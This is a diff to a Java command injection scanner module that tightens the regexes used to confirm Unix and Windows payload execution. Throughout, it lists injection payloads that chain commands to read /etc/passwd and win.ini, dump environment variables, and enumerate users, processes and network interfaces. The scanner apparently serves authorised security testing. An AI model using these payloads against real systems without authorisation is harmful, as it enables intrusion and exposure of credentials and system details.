@@ -122,11 +122,11 @@ public class CommandInjectionScanner implements ScanModule {
     // Error/output-based payloads — require specific command output patterns to confirm execution.
     // Generic strings like "Linux", "42", "bin", "inet" are NOT used — they appear on normal web pages.
     private static final String[][] OUTPUT_PAYLOADS_UNIX = {
-            // id command — uid=\d+ is specific to Unix id output
-            {";id;", "REGEX:uid=\\d+", "id command (Unix)"},
-            {"|id|", "REGEX:uid=\\d+", "id command piped (Unix)"},
-            {"$(id)", "REGEX:uid=\\d+", "id via subshell (Unix)"},
-            {"`id`", "REGEX:uid=\\d+", "id via backtick (Unix)"},
+            // id command — require full id output format: uid=N(user) gid=N
+            {";id;", "REGEX:uid=\\d+\\(\\w+\\)\\s+gid=\\d+", "id command (Unix)"},
+            {"|id|", "REGEX:uid=\\d+\\(\\w+\\)\\s+gid=\\d+", "id command piped (Unix)"},
+            {"$(id)", "REGEX:uid=\\d+\\(\\w+\\)\\s+gid=\\d+", "id via subshell (Unix)"},
+            {"`id`", "REGEX:uid=\\d+\\(\\w+\\)\\s+gid=\\d+", "id via backtick (Unix)"},
             // /etc/passwd — root:x:0:0: is definitive
             {";cat /etc/passwd;", "root:x:0:0:", "/etc/passwd read (Unix)"},
             {"|cat /etc/passwd", "root:x:0:0:", "/etc/passwd piped (Unix)"},
@@ -135,7 +135,7 @@ public class CommandInjectionScanner implements ScanModule {
             {";uname -a;", "REGEX:Linux\\s+\\S+\\s+\\d+\\.\\d+\\.\\d+", "uname (Unix)"},
             {"|uname -a", "REGEX:Linux\\s+\\S+\\s+\\d+\\.\\d+\\.\\d+", "uname piped (Unix)"},
             // Newline separator
-            {"%0aid%0a", "REGEX:uid=\\d+", "id via newline (Unix)"},
+            {"%0aid%0a", "REGEX:uid=\\d+\\(\\w+\\)\\s+gid=\\d+", "id via newline (Unix)"},
             // $IFS space bypass
             {";cat${IFS}/etc/passwd;", "root:x:0:0:", "/etc/passwd via IFS (Unix)"},
             // expr math marker — unique 6-digit number to avoid matching natural page content
@@ -143,13 +143,13 @@ public class CommandInjectionScanner implements ScanModule {
             {"$(expr 97531 + 33806)", "131337", "expr math subshell (Unix)"},
             // Backtick nesting with $IFS
             {"`cat${IFS}/etc/passwd`", "root:x:0:0:", "/etc/passwd via IFS backtick (Unix)"},
-            // env/printenv — require PATH with Unix directory structure
-            {";env;", "REGEX:PATH=/(?:usr|bin|sbin)", "env dump (Unix)"},
-            {";printenv;", "REGEX:PATH=/(?:usr|bin|sbin)", "printenv (Unix)"},
-            // ifconfig/ip — require IP address format after inet keyword
-            {";ifconfig 2>/dev/null||ip addr;", "REGEX:inet\\s+\\d+\\.\\d+\\.\\d+\\.\\d+", "ifconfig/ip (Unix)"},
-            // pwd — require a Unix-like path
-            {";pwd;", "REGEX:/(?:home|root|var|tmp|usr|opt|srv|app|www)/", "pwd (Unix)"},
+            // env/printenv — require PATH with Unix directory structure followed by colon (actual PATH format)
+            {";env;", "REGEX:PATH=/(?:usr|bin|sbin)[:/]", "env dump (Unix)"},
+            {";printenv;", "REGEX:PATH=/(?:usr|bin|sbin)[:/]", "printenv (Unix)"},
+            // ifconfig/ip — require IP address format after inet keyword with CIDR or old addr: prefix
+            {";ifconfig 2>/dev/null||ip addr;", "REGEX:inet\\s+(?:addr:)?\\d+\\.\\d+\\.\\d+\\.\\d+(?:/\\d+)?", "ifconfig/ip (Unix)"},
+            // pwd — require a Unix-like path on its own line (not inside HTML/error pages)
+            {";pwd;", "REGEX:(?m)^/(?:home|root|var|tmp|usr|opt|srv|app|www)/\\S+$", "pwd (Unix)"},
             // ls -la — Unix permission strings (drwxr-xr-x) are unmistakable
             {";ls -la /;", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / (Unix)"},
             {"|ls -la /", "REGEX:[d-][rwx-]{9}\\s+\\d+\\s+\\w+\\s+\\w+", "ls -la / piped (Unix)"},
@@ -164,9 +164,9 @@ public class CommandInjectionScanner implements ScanModule {
     };
 
     private static final String[][] OUTPUT_PAYLOADS_WINDOWS = {
-            // win.ini — [fonts] section is definitive
-            {"& type C:\\Windows\\win.ini &", "[fonts]", "win.ini read (Windows)"},
-            {"| type C:\\Windows\\win.ini", "[fonts]", "win.ini piped (Windows)"},
+            // win.ini — require TWO section markers to avoid FP on pages that mention [fonts] casually
+            {"& type C:\\Windows\\win.ini &", "REGEX:(?s)(?=.*\\[fonts\\]).*\\[(?:extensions|mci extensions|files)\\]", "win.ini read (Windows)"},
+            {"| type C:\\Windows\\win.ini", "REGEX:(?s)(?=.*\\[fonts\\]).*\\[(?:extensions|mci extensions|files)\\]", "win.ini piped (Windows)"},
             // ver — require full version string format
             {"& ver &", "REGEX:Microsoft Windows \\[Version \\d+\\.", "ver command (Windows)"},
             // set /a math marker — unique number
@@ -180,8 +180,8 @@ public class CommandInjectionScanner implements ScanModule {
             {"& dir C:\\ &", "REGEX:Volume in drive [A-Z]", "dir C: (Windows)"},
             // net user — require user accounts listing header
             {"& net user &", "REGEX:User accounts for", "net user (Windows)"},
-            // tasklist — require process.exe with PID pattern
-            {"& tasklist &", "REGEX:\\w+\\.exe\\s+\\d+", "tasklist (Windows)"},
+            // tasklist — require full tasklist format: Image Name, PID, Session Name, Session#, Mem Usage
+            {"& tasklist &", "REGEX:\\w+\\.exe\\s+\\d+\\s+\\w+\\s+\\d+\\s+[\\d,]+ K", "tasklist (Windows)"},
             // wmic — require Windows with version number
             {"& wmic os get caption &", "REGEX:Microsoft Windows\\s+(?:Server\\s+)?\\d+", "wmic os (Windows)"},
             // PowerShell expressions
